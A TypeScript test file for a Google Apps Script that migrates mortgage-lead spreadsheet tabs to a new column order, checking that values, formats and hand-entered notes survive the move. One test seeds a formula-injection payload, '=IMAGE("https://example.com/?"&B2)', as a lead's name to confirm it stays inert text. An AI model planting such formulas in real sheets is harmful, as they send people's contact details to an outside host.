/**
 * migrateLeadTabs() and auditLeadTabs(), run against a fake spreadsheet holding
 * tabs in the order the live sheet has them today.
 *
 * WHY THIS FILE EXISTS. The migration runs once, by hand, on the only copy of
 * the lead record that matters, and it moves every column on five tabs. There
 * is no second attempt at getting a historical row under the right header: the
 * failure this guards against is the @38 one (a TEST flag under Contacted) made
 * across the whole Sheet at once. So what is asserted here is never "the new tab
 * has the new headers", which is trivially true, but "the value that was under
 * header X in the old tab is under header X in the new one", read back by name.
 *
 * The second half is what the function refuses to do: guess between two cells
 * that disagree, drop a column a person added, or leave a half-built tab behind.
 */
import { describe, it, expect } from 'vitest';
import { loadGas, Formula, type Tab } from './helpers/gas-harness';

type Schema = { tab: string; headers: string[] };
type Gas = {
  SOURCE_SCHEMAS: Record<string, Schema>;
  LEADS_SCHEMA: Schema;
  migrateLeadTabs: () => string[];
  auditLeadTabs: () => string[];
  doPost: (e: { postData: { contents: string } }) => unknown;
};

function load() {
  const harness = loadGas<Gas>({
    exports: ['SOURCE_SCHEMAS', 'LEADS_SCHEMA', 'migrateLeadTabs', 'auditLeadTabs', 'doPost'],
  });
  const seed = (name: string, rows: unknown[][], formats?: string[][]) => {
    const tab: Tab = { name, rows: rows.map((r) => [...r]), formats };
    harness.tabs.set(name, tab);
    return tab;
  };
  const post = (payload: Record<string, unknown>) =>
    harness.gas.doPost({ postData: { contents: JSON.stringify(payload) } });
  /** The one "(old ...)" tab left for `name`. */
  const oldTab = (name: string) => {
    const hits = [...harness.tabs.keys()].filter((k) => k.startsWith(`${name} (old `));
    expect(hits, `old tab for ${name}`).toHaveLength(1);
    return harness.tabs.get(hits[0])!;
  };
  return { ...harness, seed, post, oldTab };
}

const ATTR_OLD = [
  'UTM Source', 'UTM Medium', 'UTM Campaign', 'UTM Term', 'UTM Content',
  'Click ID', 'Click ID Type', 'Landing Page', 'Referrer',
  'First Touch Source', 'First Touch Campaign', 'First Click ID', 'First Click ID Type', 'First Touch At',
];
const TRIAGE = ['Test?', 'Status', 'Contacted'];

/** Each tab's header row as the script behind the live deployment wrote it. */
const OLD = {
  debt: [
    'Timestamp', 'First Name', 'Last Name', 'Email', 'Phone', 'State',
    'Best Time to Call', 'Lead Source', 'Home Value', 'Mortgage Balance', 'Mortgage Payment',
    'Mortgage Rate', 'Mortgage Term', 'Total Debt Balance', 'Total Debt Payment', 'Monthly Savings',
    'Refi Monthly Payment', 'Refi Monthly Savings', 'HELOAN Monthly Payment', 'HELOAN Monthly Savings',
    ...ATTR_OLD, 'Licensed?', ...TRIAGE, 'HELOAN Credit Tier', 'HELOAN Term',
  ],
  dscr: [
    'Timestamp', 'First Name', 'Last Name', 'Email', 'Phone', 'State',
    'Magnet', 'Source', 'DSCR', 'Down Payment', 'Loan Amount', 'Rate', 'Licensed?', ...ATTR_OLD, ...TRIAGE,
  ],
  fha: [
    'Timestamp', 'First Name', 'Last Name', 'Email', 'Phone', 'State',
    'Magnet', 'Source', 'Credit Score', 'Licensed?', ...ATTR_OLD, ...TRIAGE,
    'Purchase Price', 'Down Payment %', 'Rate', 'Annual Tax', 'Annual Insurance', 'Monthly HOA', 'Est. Monthly Payment',
  ],
  rei: [
    'Timestamp', 'First Name', 'Last Name', 'Email', 'Phone', 'State',
    'Magnet', 'Source', 'Licensed?', ...ATTR_OLD, ...TRIAGE,
  ],
  leads: [
    'Timestamp', 'First Name', 'Last Name', 'Email', 'Phone', 'State',
    'Loan Amount', 'Term (Years)', 'Rate (%)', 'Goals', 'Target Outcome', 'Timeline', 'Source', 'Licensed?',
    ...ATTR_OLD, ...TRIAGE,
  ],
};

/** A row for `headers`, from a { header: value } object; everything else blank. */
function rowFor(headers: string[], values: Record<string, unknown>): unknown[] {
  for (const key of Object.keys(values)) {
    if (!headers.includes(key)) throw new Error(`test row names a header the tab lacks: ${key}`);
  }
  return headers.map((h) => (h in values ? values[h] : ''));
}

/** A tab's row read back by header name. */
function read(tab: Tab, index = 1): Record<string, unknown> {
  const headers = tab.rows[0] as string[];
  return Object.fromEntries(headers.map((h, i) => [h, tab.rows[index][i] ?? '']));
}

const DEBT_ROW = {
  Timestamp: '2026-09-26T18:02:11.000Z', 'First Name': 'Steven', 'Last Name': 'Salas',
  Email: 'steven@example.com', Phone: '(714) 882-1190', State: 'CA',
  'Best Time to Call': 'Evening (5pm–8pm)', 'Lead Source': 'YouTube',
  'Home Value': 650000, 'Mortgage Balance': 350000, 'Mortgage Payment': 2200,
  'Mortgage Rate': 3.5, 'Mortgage Term': 27,
  'Total Debt Balance': 29656.8, 'Total Debt Payment': 670, 'Monthly Savings': 334,
  'Refi Monthly Payment': 2377, 'Refi Monthly Savings': 493,
  'HELOAN Monthly Payment': 336, 'HELOAN Monthly Savings': 334,
  'UTM Source': 'youtube', 'UTM Campaign': 'yt-heloc', 'Click ID': 'GCLID-1', 'Click ID Type': 'gclid',
  'First Touch Source': 'google', 'First Touch Campaign': 'heloc-q4', 'First Touch At': '2026-09-01T00:00:00.000Z',
  'Licensed?': 'Yes', 'Test?': '', Status: 'Called 28 Sep, left voicemail', Contacted: 'Yes',
  'HELOAN Credit Tier': '10.49', 'HELOAN Term': '15',
};

describe('migrating a tab moves every value with its header', () => {
  it('Debt Consolidation: each old value is under the same name in the new order', () => {
    const h = load();
    h.seed('Debt Consolidation', [OLD.debt, rowFor(OLD.debt, DEBT_ROW)]);
    const lines = h.gas.migrateLeadTabs();

    const tab = h.tabs.get('Debt Consolidation')!;
    expect(tab.rows[0]).toEqual(h.gas.SOURCE_SCHEMAS['DebtConsolidation'].headers);
    const row = read(tab);
    for (const [header, value] of Object.entries(DEBT_ROW)) {
      if (header === 'Best Time to Call' || header === 'Lead Source') continue;
      expect(row[header], header).toBe(value);
    }
    expect(lines.find((l) => l.startsWith('Debt Consolidation:'))).toContain('migrated 1 row(s)');
  });

  it('keeps what a person typed into Status and Contacted', () => {
    // The two cells nothing can regenerate: the record of which leads were called.
    const h = load();
    h.seed('Debt Consolidation', [OLD.debt, rowFor(OLD.debt, DEBT_ROW)]);
    h.gas.migrateLeadTabs();
    expect(read(h.tabs.get('Debt Consolidation')!)).toMatchObject({
      Status: 'Called 28 Sep, left voicemail', Contacted: 'Yes',
    });
  });

  it('leaves the columns a historical row has no answer for blank, never 0', () => {
    const h = load();
    h.seed('Debt Consolidation', [OLD.debt, rowFor(OLD.debt, DEBT_ROW)]);
    h.gas.migrateLeadTabs();
    const row = read(h.tabs.get('Debt Consolidation')!);
    for (const header of [
      'Submission ID', 'Form ID', 'Page', 'Magnet/Goal', 'Debts', 'Weighted Avg Rate', 'Estimated Home Equity',
      'Current LTV', 'Current Monthly Payment', 'Same-Payoff Refi Payment', 'Same-Payoff Refi Savings',
      'Rate Source Date', 'First Touch Medium',
    ]) {
      expect(row[header], header).toBe('');
    }
  });

  it('drops Best Time to Call and Lead Source from the new tab and keeps them in the old one', () => {
    const h = load();
    h.seed('Debt Consolidation', [OLD.debt, rowFor(OLD.debt, DEBT_ROW)]);
    const lines = h.gas.migrateLeadTabs();

    const headers = h.tabs.get('Debt Consolidation')!.rows[0] as string[];
    expect(headers).not.toContain('Best Time to Call');
    expect(headers).not.toContain('Lead Source');

    const old = h.oldTab('Debt Consolidation');
    expect(old.rows[0]).toEqual(OLD.debt);
    expect(read(old)).toMatchObject({ 'Best Time to Call': 'Evening (5pm–8pm)', 'Lead Source': 'YouTube' });
    expect(lines.join('\n')).toContain('left behind Best Time to Call, Lead Source');
  });

  it('names the original "(old <date>)" and leaves it byte for byte as it was', () => {
    const h = load();
    const original = [OLD.debt, rowFor(OLD.debt, DEBT_ROW)];
    h.seed('Debt Consolidation', original);
    h.gas.migrateLeadTabs();
    const old = h.oldTab('Debt Consolidation');
    expect(old.name).toMatch(/^Debt Consolidation \(old \d{4}-\d{2}-\d{2}\)$/);
    expect(old.rows).toEqual(original);
    expect(h.tabs.has('Debt Consolidation (new)')).toBe(false);
  });

  it('renames Magnet to Magnet/Goal and carries the magnets across', () => {
    const h = load();
    h.seed('DSCR', [OLD.dscr, rowFor(OLD.dscr, {
      Email: 'jane@example.com', Magnet: 'DSCR Rate & Cash Flow Guide', Source: 'dscr',
      DSCR: '1.17', 'Down Payment': '25%', 'Loan Amount': '$240,000', Rate: '7.00%', 'Licensed?': 'Yes',
    })]);
    h.gas.migrateLeadTabs();
    const tab = h.tabs.get('DSCR')!;
    expect(tab.rows[0]).toEqual(h.gas.SOURCE_SCHEMAS['dscr'].headers);
    expect(read(tab)).toMatchObject({
      'Magnet/Goal': 'DSCR Rate & Cash Flow Guide', DSCR: '1.17', 'Down Payment': '25%',
      'Loan Amount': '$240,000', Rate: '7.00%', 'Licensed?': 'Yes', 'Monthly Rent': '',
    });
  });

  it('FHA: brings the estimator columns in from after Contacted', () => {
    const h = load();
    h.seed('FHA', [OLD.fha, rowFor(OLD.fha, {
      Email: 'ben@example.com', 'Credit Score': '680', 'Test?': 'TEST',
      'Purchase Price': 400000, 'Down Payment %': 3.5, Rate: 6.5, 'Est. Monthly Payment': 2950,
    })]);
    h.gas.migrateLeadTabs();
    const tab = h.tabs.get('FHA')!;
    const headers = tab.rows[0] as string[];
    expect(headers.indexOf('Purchase Price')).toBe(headers.indexOf('Credit Score') + 1);
    expect(headers.at(-1)).toBe('Contacted');
    expect(read(tab)).toMatchObject({
      'Credit Score': '680', 'Purchase Price': 400000, 'Down Payment %': 3.5, Rate: 6.5,
      'Est. Monthly Payment': 2950, 'Test?': 'TEST', Contacted: '',
    });
  });

  it('migrates every lead tab in one run, with the same number of rows each', () => {
    const h = load();
    const counts: Record<string, number> = { 'Debt Consolidation': 3, DSCR: 5, FHA: 2, 'Real Estate Investing': 1, Leads: 4 };
    const olds: Record<string, string[]> = {
      'Debt Consolidation': OLD.debt, DSCR: OLD.dscr, FHA: OLD.fha, 'Real Estate Investing': OLD.rei, Leads: OLD.leads,
    };
    for (const [name, n] of Object.entries(counts)) {
      const rows = Array.from({ length: n }, (_, i) => rowFor(olds[name], { Email: `lead${i}@example.com`, Contacted: `c${i}` }));
      h.seed(name, [olds[name], ...rows]);
    }
    h.gas.migrateLeadTabs();
    for (const [name, n] of Object.entries(counts)) {
      const tab = h.tabs.get(name)!;
      expect(tab.rows.length, name).toBe(n + 1);
      for (let i = 0; i < n; i++) {
        expect(read(tab, i + 1), name).toMatchObject({ Email: `lead${i}@example.com`, Contacted: `c${i}` });
      }
      expect(h.oldTab(name).rows.length, name).toBe(n + 1);
    }
  });

  it('holds text as text, so a phone or a dollar string is not re-read as a number', () => {
    const h = load();
    h.seed('DSCR', [OLD.dscr, rowFor(OLD.dscr, { Email: 'a@example.com', Phone: '+1 714 882 1190', 'Loan Amount': '$240,000', 'Licensed?': 'Yes' })]);
    h.gas.migrateLeadTabs();
    const tab = h.tabs.get('DSCR')!;
    const headers = tab.rows[0] as string[];
    expect(tab.formats![1][headers.indexOf('Phone')]).toBe('@');
    expect(tab.formats![1][headers.indexOf('Loan Amount')]).toBe('@');
  });

  it('carries a formula-like name across as text, never as a live formula', () => {
    // Since @45 the formula guard stores =IMAGE(...) typed as a name as text.
    // getValues() hands that back as the bare string, and writing it straight
    // back would make it a formula again, able to send other leads' details
    // off-site. It goes back through safeCell, and the verify step still sees
    // the same text it read.
    const h = load();
    const attack = '=IMAGE("https://example.com/?"&B2)';
    h.seed('Leads', [OLD.leads, rowFor(OLD.leads, { 'First Name': attack, Email: 'x@example.com', 'Licensed?': 'No' })]);
    const report = h.gas.migrateLeadTabs().join(' | ');
    expect(report).toMatch(/Leads: migrated 1 row/);
    const tab = h.tabs.get('Leads')!;
    const value = tab.rows[1][(tab.rows[0] as string[]).indexOf('First Name')];
    expect(value).toBe(attack);
    expect(value).not.toBeInstanceOf(Formula);
  });

  it('keeps a number or a date in the format it had', () => {
    const h = load();
    const when = new Date('2026-09-26T18:02:11.000Z');
    const formats = [OLD.debt.map(() => 'General'), OLD.debt.map((name) => (name === 'Timestamp' ? 'yyyy-mm-dd hh:mm' : name === 'Home Value' ? '$#,##0' : 'General'))];
    h.seed('Debt Consolidation', [OLD.debt, rowFor(OLD.debt, { ...DEBT_ROW, Timestamp: when })], formats);
    h.gas.migrateLeadTabs();
    const tab = h.tabs.get('Debt Consolidation')!;
    const headers = tab.rows[0] as string[];
    expect(tab.rows[1][headers.indexOf('Timestamp')]).toEqual(when);
    expect(tab.formats![1][headers.indexOf('Timestamp')]).toBe('yyyy-mm-dd hh:mm');
    expect(tab.formats![1][headers.indexOf('Home Value')]).toBe('$#,##0');
  });
});

describe('what the migration will not do', () => {
  it('carries a column a person added by hand across, after the schema columns', () => {
    const withNotes = [...OLD.rei, 'Darren notes'];
    const h = load();
    h.seed('Real Estate Investing', [withNotes, rowFor(withNotes, { Email: 'ada@example.com', 'Darren notes': 'wants a duplex in Tampa' })]);
    const lines = h.gas.migrateLeadTabs();
    const tab = h.tabs.get('Real Estate Investing')!;
    const headers = tab.rows[0] as string[];
    expect(headers.slice(0, -1)).toEqual(h.gas.SOURCE_SCHEMAS['real-estate-investing'].headers);
    expect(headers.at(-1)).toBe('Darren notes');
    expect(read(tab)['Darren notes']).toBe('wants a duplex in Tampa');
    expect(lines.join('\n')).toContain('carried "Darren notes"');
  });

  it('merges a header the sheet has twice when only one copy holds a value', () => {
    // What @38 left on the live tab: Status and Contacted a second time.
    const doubled = [...OLD.debt.slice(0, 38), 'Status', 'Contacted'];
    const row = doubled.map(() => '' as unknown);
    row[doubled.indexOf('Email')] = 'cy@example.com';
    row[37] = 'TEST'; // the misfiled flag, under the first Contacted
    row[38] = 'Called'; // a person's note, under the second Status
    const h = load();
    h.seed('Debt Consolidation', [doubled, row]);
    h.gas.migrateLeadTabs();
    expect(read(h.tabs.get('Debt Consolidation')!)).toMatchObject({ Status: 'Called', Contacted: 'TEST' });
  });

  it('refuses to choose when the two copies disagree, and changes nothing', () => {
    const doubled = [...OLD.debt.slice(0, 38), 'Status', 'Contacted'];
    const row = doubled.map(() => '' as unknown);
    row[36] = 'New';
    row[38] = 'Called';
    const h = load();
    const tab = h.seed('Debt Consolidation', [doubled, row]);
    const before = JSON.stringify(tab.rows);
    const lines = h.gas.migrateLeadTabs();

    expect(lines.find((l) => l.startsWith('Debt Consolidation:'))).toContain('NOT MIGRATED');
    expect(lines.join('\n')).toContain('row 2 has two different values under "Status"');
    expect(JSON.stringify(h.tabs.get('Debt Consolidation')!.rows)).toBe(before);
    expect([...h.tabs.keys()].some((k) => k.includes('(old') || k.includes('(new)'))).toBe(false);
  });

  it('carries on with the other tabs when one is refused', () => {
    const doubled = [...OLD.debt.slice(0, 38), 'Status', 'Contacted'];
    const row = doubled.map(() => '' as unknown);
    row[36] = 'New';
    row[38] = 'Called';
    const h = load();
    h.seed('Debt Consolidation', [doubled, row]);
    h.seed('DSCR', [OLD.dscr, rowFor(OLD.dscr, { Email: 'a@example.com' })]);
    h.gas.migrateLeadTabs();
    expect(h.tabs.get('DSCR')!.rows[0]).toEqual(h.gas.SOURCE_SCHEMAS['dscr'].headers);
  });

  it('is safe to run twice: a migrated tab is left alone', () => {
    const h = load();
    h.seed('Debt Consolidation', [OLD.debt, rowFor(OLD.debt, DEBT_ROW)]);
    h.gas.migrateLeadTabs();
    const after = JSON.stringify(h.tabs.get('Debt Consolidation')!.rows);
    const names = [...h.tabs.keys()].sort();

    const again = h.gas.migrateLeadTabs();
    expect(again.find((l) => l.startsWith('Debt Consolidation:'))).toContain('already in schema order');
    expect(JSON.stringify(h.tabs.get('Debt Consolidation')!.rows)).toBe(after);
    expect([...h.tabs.keys()].sort()).toEqual(names);
  });

  it('clears a "(new)" tab a failed run left behind instead of tripping over it', () => {
    const h = load();
    h.seed('Debt Consolidation', [OLD.debt, rowFor(OLD.debt, DEBT_ROW)]);
    h.seed('Debt Consolidation (new)', [['half', 'built']]);
    h.gas.migrateLeadTabs();
    expect(h.tabs.has('Debt Consolidation (new)')).toBe(false);
    expect(h.tabs.get('Debt Consolidation')!.rows[0]).toEqual(h.gas.SOURCE_SCHEMAS['DebtConsolidation'].headers);
  });

  it('says so, and does nothing, for a tab that does not exist yet', () => {
    const h = load();
    const lines = h.gas.migrateLeadTabs();
    expect(lines.find((l) => l.startsWith('Home Equity:'))).toContain('no such tab');
    expect([...h.tabs.keys()].filter((k) => k !== 'Debug')).toEqual([]);
  });

  it('never touches Follow-ups, Debug, Newsletter or Qualify', () => {
    const h = load();
    const queue = [['Queued At', 'Status', 'Processed At', 'Error', 'Source', 'Email', 'Payload'], ['t', 'pending', '', '', 'dscr', 'a@example.com', '{}']];
    h.seed('Follow-ups', queue);
    h.seed('Newsletter', [['Timestamp', 'Email', 'Source'], ['t', 'n@example.com', 'newsletter']]);
    h.seed('Qualify', [['Timestamp', 'First Name'], ['t', 'Q']]);
    h.gas.migrateLeadTabs();
    expect(h.tabs.get('Follow-ups')!.rows).toEqual(queue);
    expect(h.tabs.get('Newsletter')!.rows).toHaveLength(2);
    expect(h.tabs.get('Qualify')!.rows[0]).toEqual(['Timestamp', 'First Name']);
    expect([...h.tabs.keys()].some((k) => k.includes('(old'))).toBe(false);
  });
});

describe('the first lead after the migration', () => {
  it('lands in the new tab, under the new headers, with no drift notice', () => {
    const mail: unknown[] = [];
    const harness = loadGas<Gas>({ exports: ['SOURCE_SCHEMAS', 'migrateLeadTabs', 'doPost'], onMail: (m) => mail.push(m) });
    harness.tabs.set('Debt Consolidation', { name: 'Debt Consolidation', rows: [[...OLD.debt], rowFor(OLD.debt, DEBT_ROW)] });
    harness.gas.migrateLeadTabs();
    harness.gas.doPost({ postData: { contents: JSON.stringify({
      source: 'DebtConsolidation', email: 'new@example.com', state: 'TX', monthlySavings: -80, formId: 'debt-savings-calculator',
    }) } });

    const tab = harness.tabs.get('Debt Consolidation')!;
    expect(tab.rows).toHaveLength(3);
    expect(tab.rows[0]).toEqual(harness.gas.SOURCE_SCHEMAS['DebtConsolidation'].headers);
    expect(read(tab, 2)).toMatchObject({ Email: 'new@example.com', 'Monthly Savings': -80, 'Licensed?': 'Yes' });
    expect(read(tab, 1)).toMatchObject({ Email: 'steven@example.com', Contacted: 'Yes' });
    expect(mail).toEqual([]);
  });
});

describe('auditLeadTabs', () => {
  it('reads without writing to any lead tab', () => {
    const h = load();
    const tab = h.seed('Debt Consolidation', [OLD.debt, rowFor(OLD.debt, DEBT_ROW)]);
    const before = JSON.stringify(tab.rows);
    h.gas.auditLeadTabs();
    expect(JSON.stringify(h.tabs.get('Debt Consolidation')!.rows)).toBe(before);
    expect([...h.tabs.keys()].sort()).toEqual(['Debt Consolidation', 'Debug']);
  });

  it('says what each tab will gain, lose and carry', () => {
    const h = load();
    h.seed('Debt Consolidation', [[...OLD.debt, 'Darren notes'], rowFor([...OLD.debt, 'Darren notes'], { ...DEBT_ROW, 'Darren notes': 'x' })]);
    const line = h.gas.auditLeadTabs().find((l) => l.startsWith('Debt Consolidation:'))!;
    expect(line).toContain('1 row(s)');
    expect(line).toContain('NEEDS MIGRATION');
    expect(line).toContain('Submission ID');
    expect(line).toContain('Left behind: Best Time to Call, Lead Source');
    expect(line).toContain('"Darren notes"');
  });

  it('reports a migrated tab as in order, and a missing one as not yet created', () => {
    const h = load();
    h.seed('DSCR', [h.gas.SOURCE_SCHEMAS['dscr'].headers]);
    const lines = h.gas.auditLeadTabs();
    expect(lines.find((l) => l.startsWith('DSCR:'))).toContain('already in schema order');
    expect(lines.find((l) => l.startsWith('ADU:'))).toContain('no such tab yet');
  });

  it('writes its findings to the Debug tab, where a web-app run can be read back', () => {
    const h = load();
    h.seed('DSCR', [OLD.dscr]);
    h.gas.auditLeadTabs();
    const debug = h.tabs.get('Debug')!.rows.map((r) => String(r[1]));
    expect(debug.some((m) => m.startsWith('auditLeadTabs: DSCR:'))).toBe(true);
  });
});
